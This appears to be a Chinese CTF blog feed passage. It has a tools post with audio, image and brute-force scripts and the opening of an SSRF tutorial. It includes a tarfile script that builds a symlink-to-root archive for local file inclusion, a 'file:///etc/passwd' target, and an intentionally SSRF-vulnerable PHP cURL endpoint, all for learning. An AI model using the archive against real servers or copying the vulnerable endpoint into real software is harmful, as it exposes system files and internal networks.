function_">main</span>(<span class="hljs-params">idx</span>):<br>    f = <span class="hljs-string">b&#x27;l\x90C\x99e\x19\x03Br\x02\xd2\x98@\xf8\xe8deWOvv\x16[G&#125;GA\\\xd2rv`\x16\x18&#x27;</span><br><br>    <span class="hljs-keyword">for</span> key_ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(idx, idx + <span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span>):<br>        S_box = ...<br>        key_ = <span class="hljs-built_in">str</span>(key_)<br>        S = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>            S[i] = i<br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>            j = (j ^ S[i] ^ <span class="hljs-built_in">ord</span>(key_[i % <span class="hljs-built_in">len</span>(key_)])) % <span class="hljs-number">256</span><br>            S[i], S[j] = S[j], S[i]<br><br>        amount = <span class="hljs-built_in">len</span>(f)<br>        enc = f<br><br>        i = j = <span class="hljs-number">0</span><br>        ctr = <span class="hljs-number">0</span><br>        out = []<br>        <span class="hljs-keyword">while</span> ctr &lt; amount:<br>            i = (i * j) % <span class="hljs-number">256</span><br>            j = (i + S[j]) % <span class="hljs-number">256</span><br>            K = (S[i] &amp; S[j])<br>            out.append(enc[ctr] ^ S_box[K])<br>            ctr += <span class="hljs-number">1</span><br><br>        dec = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234566789&#125;_&#123;&quot;</span>])<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dec) == <span class="hljs-built_in">len</span>(f):<br>            <span class="hljs-built_in">print</span>(dec)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    idx = [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">2</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">3</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">4</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">5</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">6</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">7</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">9</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">10</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">11</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">13</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">14</span>]<br>    pool = Pool(<span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">with</span> pool:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pool.imap_unordered(main, idx):<br>            <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><h2 id="python保存gif图片的每一帧"><a href="#python保存gif图片的每一帧" class="headerlink" title="python保存gif图片的每一帧"></a>python保存gif图片的每一帧</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageSequence<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_frames</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">with</span> Image.<span class="hljs-built_in">open</span>(image_path) <span class="hljs-keyword">as</span> im:<br>        <span class="hljs-keyword">for</span> i, frame <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ImageSequence.Iterator(im)):<br>            frame.save(<span class="hljs-string">f&#x27;frames/frame_<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>, <span class="hljs-string">&#x27;PNG&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="python-tarfile使用"><a href="#python-tarfile使用" class="headerlink" title="python tarfile使用"></a>python tarfile使用</h2><p>tar.extractall支持symbolic link，只检查文件的名称是不够的，服务端不做过滤就解压可能出现LFI</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit.tar.gz&#x27;</span>, <span class="hljs-string">&#x27;w:gz&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>    <span class="hljs-comment"># First file</span><br>    info1 = tarfile.TarInfo(<span class="hljs-string">&quot;test&quot;</span>)<br>    info1.<span class="hljs-built_in">type</span> = tarfile.SYMTYPE<br>    info1.linkname = <span class="hljs-string">&quot;/&quot;</span> <br>    tar.addfile(info1)<br>    <span class="hljs-comment"># Second file</span><br>    info2 = tarfile.TarInfo(<span class="hljs-string">&quot;./test/name&quot;</span>) <span class="hljs-comment">#若服务端指定不能以绝对路径/开头，可以这样绕过</span><br>    info2.<span class="hljs-built_in">type</span> = tarfile.SYMTYPE<br>    info2.linkname = <span class="hljs-string">&quot;linkname&quot;</span><br>    tar.addfile(info2)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">The TarInfo class in the tarfile module is used to represent information about a file or directory in a tar archive. It provides attributes and methods to set and retrieve various properties of the file or directory.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here are some key attributes of the TarInfo class:</span><br><span class="hljs-string"></span><br><span class="hljs-string">name: The name of the file or directory. This can be an absolute or relative path.</span><br><span class="hljs-string">size: The size of the file in bytes. For directories, this is set to 0.</span><br><span class="hljs-string">mtime: The modification time of the file or directory, represented as a Unix timestamp.</span><br><span class="hljs-string">type: The type of the file or directory. This can be one of the following constants defined in the tarfile module: tarfile.REGTYPE (regular file), tarfile.DIRTYPE (directory), tarfile.LNKTYPE (hard link), tarfile.SYMTYPE (symbolic link), tarfile.CHRTYPE (character special file), tarfile.BLKTYPE (block special file), tarfile.FIFOTYPE (FIFO special file), or tarfile.CONTTYPE (contiguous file).</span><br><span class="hljs-string">linkname: The target of a hard link or symbolic link.</span><br><span class="hljs-string">uid: The user ID of the owner of the file or directory.</span><br><span class="hljs-string">gid: The group ID of the owner of the file or directory.</span><br><span class="hljs-string">mode: The permissions of the file or directory, represented as an octal number.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="描绘纯色背景GIF中的单一物品的轨迹"><a href="#描绘纯色背景GIF中的单一物品的轨迹" class="headerlink" title="描绘纯色背景GIF中的单一物品的轨迹"></a>描绘纯色背景GIF中的单一物品的轨迹</h2><ul><li><a href="https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls">https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls</a></li><li><a href="https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls">https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls</a></li></ul><h2 id="Mac-M1安装Ghidra"><a href="#Mac-M1安装Ghidra" class="headerlink" title="Mac M1安装Ghidra"></a>Mac M1安装Ghidra</h2><ol><li>去 <a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a> 下载最新版本ghidra</li><li>去 <a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a> 下载要安装的ghidra版本的最低需求jdk</li><li>运行ghidraRun。若要求输入jdk路径，输入jdk安装路径&#x2F;Contents&#x2F;Home</li></ol><h2 id="C语言signal号表"><a href="#C语言signal号表" class="headerlink" title="C语言signal号表"></a>C语言signal号表</h2><p><a href="https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf">https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf</a></p><h2 id="JS下载文件"><a href="#JS下载文件" class="headerlink" title="JS下载文件"></a>JS下载文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">download</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">blob</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">blob</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">const</span> downloadLink = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>            downloadLink.<span class="hljs-property">href</span> = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);<br>            downloadLink.<span class="hljs-property">download</span> = <span class="hljs-string">&#x27;filename&#x27;</span>;<br>            downloadLink.<span class="hljs-title function_">click</span>();<br>        &#125;);<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">500</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="python获取wav文件频率"><a href="#python获取wav文件频率" class="headerlink" title="python获取wav文件频率"></a>python获取wav文件频率</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> scipy.io.wavfile <span class="hljs-keyword">as</span> wav<br>ans=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    sample_rate, audio_data = wav.read(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    fft_data = np.fft.fft(audio_data)<br>    frequencies = np.fft.fftfreq(<span class="hljs-built_in">len</span>(fft_data), <span class="hljs-number">1</span>/sample_rate)<br>    positive_frequencies = frequencies[:<span class="hljs-built_in">len</span>(frequencies)//<span class="hljs-number">2</span>]<br>    magnitude_spectrum = np.<span class="hljs-built_in">abs</span>(fft_data[:<span class="hljs-built_in">len</span>(fft_data)//<span class="hljs-number">2</span>])<br>    max_index = np.argmax(magnitude_spectrum)<br>    max_frequency = positive_frequencies[max_index]<br>    ans.append(<span class="hljs-built_in">str</span>(max_frequency)[:-<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h2 id="使用Filebin-api"><a href="#使用Filebin-api" class="headerlink" title="使用Filebin api"></a>使用Filebin api</h2><p>这样就能在linux终端上传文件了。去 <a href="https://filebin.net/api">https://filebin.net/api</a> ，点击upload a file to a bin,点击Try it out，填写bin名（这个访问 <a href="https://filebin.net/">https://filebin.net/</a> 就能得到一个名字）和上传的文件名。然后选择文件（随便一个即可），点击execute。如果成功，就可以copy curl命令到终端上。大概是这样：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;https://filebin.net/binname/filename&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span> \<br>  --data-binary <span class="hljs-string">&#x27;@path/to/file&#x27;</span><br></code></pre></td></tr></table></figure><p>上传成功后get<code>https://filebin.net/binname/filename</code>即可。今天用的时候发现服务器满了传不了文件，我又找了另一个api通用的filebin： <a href="https://arquivos-saude.recife.pe.gov.br/">https://arquivos-saude.recife.pe.gov.br/</a></p><p>今天发现两个好像都down了……找了个替代的： <a href="https://www.file.io/">https://www.file.io/</a> 。这个的api稍微难用点，但是模板如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;https://file.io/&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: multipart/form-data&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;file=@path/to/file&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;expires=ISO 8601 date string&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;maxDownloads=1&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;autoDelete=true&#x27;</span><br></code></pre></td></tr></table></figure><p>这个ISO 8601 date string可以在 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString</a> 运行代码得到</p><h2 id="SMC文件解码"><a href="#SMC文件解码" class="headerlink" title="SMC文件解码"></a>SMC文件解码</h2><p>适用于简单的smc</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SMC&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    file=f.read()<br>offset= <span class="hljs-comment">#smc code出现的偏移</span><br>length= <span class="hljs-comment">#smc code段的长度</span><br>obfuscated=file[offset:offset+length]<br>res=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> obfuscated: <span class="hljs-comment">#这块为具体的解码逻辑，可以比这里更复杂</span><br>    res.append(i^<span class="hljs-number">0x66</span>)<br>res=<span class="hljs-built_in">bytes</span>(res)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/SMC_out&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(file[:offset]+res+file[offset+length:]) <span class="hljs-comment">#重新拼接回去</span><br></code></pre></td></tr></table></figure><h2 id="python获取wav文件的频率"><a href="#python获取wav文件的频率" class="headerlink" title="python获取wav文件的频率"></a>python获取wav文件的频率</h2><ul><li><a href="https://github.com/4n86rakam1/writeup/tree/main/SunshineCTF_2023/scripting/SimonProgrammer_3">SimonProgrammer 3</a></li><li><a href="https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93">https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93</a></li><li><a href="https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py">https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py</a></li></ul><h2 id="python恢复shifted-image"><a href="#python恢复shifted-image" class="headerlink" title="python恢复shifted image"></a>python恢复shifted image</h2><p>shifted image看起来倾斜，像是被拉伸了一样</p><p><a href="https://berliangabriel.github.io/post/tcp1p-ctf-2023/">https://berliangabriel.github.io/post/tcp1p-ctf-2023/</a></p><h2 id="Git使用"><a href="#Git使用" class="headerlink" title="Git使用"></a>Git使用</h2><ul><li>如何设置commit时的username： <a href="https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git">https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git</a> 。同理，设置邮箱可用<code>git config --global user.email &quot;email&quot;</code></li></ul><h2 id="如何将wav文件转为standard-IQ-file"><a href="#如何将wav文件转为standard-IQ-file" class="headerlink" title="如何将wav文件转为standard IQ file"></a>如何将wav文件转为standard IQ file</h2><p><a href="https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/">https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/</a></p><h2 id="A-Block-and-a-Hard-Place"><a href="#A-Block-and-a-Hard-Place" class="headerlink" title="A Block and a Hard Place"></a><a href="https://ctf.krauq.com/bi0sctf-2024">A Block and a Hard Place</a></h2><p>用户可以控制角色在有障碍的地图里走动，要求在事先不知道地图的情况下通过行走时的反馈描绘出地图</p><h2 id="Brainf-ck-Search"><a href="#Brainf-ck-Search" class="headerlink" title="Brainf*ck Search"></a><a href="https://blog.bi0s.in/2024/02/26/Misc/BFS-BrainfuckSearch-bi0sctf2024/">Brainf*ck Search</a></h2><p>brainfuck code golfing挑战，使用有限的代码在tape中寻找flag子节。其他wp： <a href="https://www.writeup.no/posts/bi0s-24-misc-brainfuck/">https://www.writeup.no/posts/bi0s-24-misc-brainfuck/</a></p><h2 id="Maize"><a href="#Maize" class="headerlink" title="Maize"></a><a href="https://github.com/WolvSec/WolvCTF-2024-Challenges-Public/tree/master/rev/maize">Maize</a></h2><p>立体方块迷宫求解器</p><h2 id="rockyoudle"><a href="#rockyoudle" class="headerlink" title="rockyoudle"></a><a href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#rockyoudle">rockyoudle</a></h2><p>wordle求解器</p><h2 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a><a href="https://ctf.krauq.com/bcactf-2024">Mysterious Melody</a></h2><p>python获取midi文件的音符</p><p>使用audacity的手动做法： <a href="https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody">https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody</a></p><h2 id="Touch-Tone-Telephone"><a href="#Touch-Tone-Telephone" class="headerlink" title="Touch Tone Telephone"></a><a href="https://ctf.krauq.com/bcactf-2024">Touch Tone Telephone</a></h2><p>python解码dtmf wav脚本</p><p>题目官方的rust脚本： <a href="https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone">https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone</a></p><h2 id="Picoify"><a href="#Picoify" class="headerlink" title="Picoify"></a><a href="https://github.com/TFNS/writeups/tree/master/2024-06-30-UIUCTF/picoify">Picoify</a></h2><p>编写能在Microchip PIC16F628A上运行的压缩代码。特别之处在于，这玩意SRAM才224字节，甚至没法把要压缩的内容一股脑读进来，因此这里实现的是streaming compression。另外，PIC16 assembly code可以参考wp里的方式生成，先写个C代码再用<a href="https://www.microchip.com/en-us/tools-resources/develop/mplab-xc-compilers">编译器</a>编译。这块最后实现的算法是huffman，并用python代码实现解压</p><p><a href="https://maplebacon.org/2024/07/uiuctf-picoify/">https://maplebacon.org/2024/07/uiuctf-picoify/</a> 是另一种解法。作者直接根据压缩的内容发明了一个压缩算法。不过还是学到了很多东西：</p><ul><li>如何计算文本的entropy</li><li>使用<a href="https://www.gnu.org/software/gperf/">gperf</a>生成完美哈希表</li><li>python内部会使用sbrk系统调用为常数量分配空间。如果sbrk被禁而且非要往里面塞大型变量的话，可以利用注释将内容“走私”进去，然后运行时访问程序的源代码将内容拿出来</li><li>清理sys.argv可以获得一部分内存（取决于原本sys.argv的大小）</li></ul><h1 id="WebSocket-VPN"><a href="#WebSocket-VPN" class="headerlink" title="WebSocket VPN"></a><a href="https://ouuan.moe/post/2024/07/ductf-2024">WebSocket VPN</a></h1><p>通过websocket发送TCP握手IP报文和HTTP请求</p><h1 id="sleepy-alarm"><a href="#sleepy-alarm" class="headerlink" title="sleepy-alarm"></a><a href="https://yun.ng/c/ctf/2024-ictf/forensics/sleepy-alarm">sleepy-alarm</a></h1><ul><li>使用audacity+python分析音频。有时候audacity里结果不清楚，在python里将相同的操作重复一遍再plot出来就清楚了</li><li>应用band pass noise reduction过滤某个频率出的噪音</li><li>另一种按时间间隔读取bit的做法： <a href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm</a></li></ul><h1 id="left-in-the-dark"><a href="#left-in-the-dark" class="headerlink" title="left-in-the-dark"></a><a href="https://yun.ng/c/ctf/2024-ictf/misc/left-in-the-dark">left-in-the-dark</a></h1><p>升级版A*迷宫寻路算法，无法提前得知迷宫地图，需要一边走一边探索路线，走错路后还需要重新规划路线并回退之前的操作</p><h1 id="MAN-in-the-middle"><a href="#MAN-in-the-middle" class="headerlink" title="MAN in the middle"></a><a href="https://yun.ng/c/ctf/2024-deadsec-ctf/misc/man-in-the-middle">MAN in the middle</a></h1><p>解码曼彻斯特(Manchester)编码信号wav</p><h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2><ul><li>小端下将bytes转为数字：<code>int.from_bytes(msg, &#39;little&#39;)</code>。类似地，大端填<code>&#39;big&#39;</code></li><li>pwntools将内存&#x2F;数字转为浮点数形式： <a href="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/">https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</a> ，程序scanf用<code>%lf</code>时用</li><li><a href="https://github.com/DvorakDwarf/Infinite-Storage-Glitch">Infinite-Storage-Glitch</a><ul><li>youtube不限制上传的视频数量，所以只要把文件转成视频，就有了无限的存储……</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2024/09/01/ssrf/"/>
    <url>/2024/09/01/ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery 服务端请求伪造<br>攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求<br>以便获取服务端网络内部的资源<br>一句话总结：<br>控制服务端使用指定协议访问指定的url<br>A：你为什么这么干？<br>B：是谁谁谁让我干的<br>A：谁谁谁让你去吃shi你去不去？<br>特点：<br>1 让别人访问我们访问不到的url<br>2 拿到自己本来拿不到的数据</p><p>条件：<br>1 别人能帮我访问url 服务端有接受url地址并进行访问的功能<br>2 url地址外部可控<br><a href="https://xxx.com/index.php?url=http://www.baidu.com">https://xxx.com/index.php?url=http://www.baidu.com</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;location:&#x27;</span>.<span class="hljs-variable">$url</span>); <span class="hljs-comment">//302的跳转</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>是不是属于ssrf?</p><p>告诉浏览器，你去访问这个地址<br>此时，浏览器，是客户端还是服务端</p><p>客户端   </p><p>此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去<br>是浏览器去访问，不是服务端去访问<br>所以，不是SSRF<br>只能算 任意跳转漏<br>分清  是否是ssrf<br>url地址可控<br><a href="http://10.xx.xx.xx/">http://10.xx.xx.xx/</a><br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>URL格式<br>URI &#x3D; scheme:[&#x2F;&#x2F;authority]path[?query][#fragment]<br>schema: 协议头:&#x2F;&#x2F;authority [userinfo@]host[:port]</p><p>默认使用80端口，而80端口默认情况下，是可以省略<br><a href="http://www.baidu.com/robots.txt">http://www.baidu.com/robots.txt</a></p><p>本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件<br>默认使用匿名账户访问<br>userinfo: username:password@hos<br>schema:&#x2F;&#x2F;username:password@host:port&#x2F;path?a&#x3D;b#top<br><a href="http://ctfshow:hacker@www.baidu.com/robots.txt">http://ctfshow:hacker@www.baidu.com/robots.txt</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//初始化一个cURL会话</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//设定返回信息中包含响应信息头</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//启用时会将头文件的信息作为数据流输出。 </span><br><span class="hljs-comment">//参数为1表示输出信息头,为0表示不输出</span><br> <br><span class="hljs-comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//参数为1表示$result,为0表示echo $result</span><br> <br><span class="hljs-comment">//执行一个cURL会话</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//关闭一个curl会话</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SSRF的利用面"><a href="#SSRF的利用面" class="headerlink" title="SSRF的利用面"></a>SSRF的利用面</h1><p><a 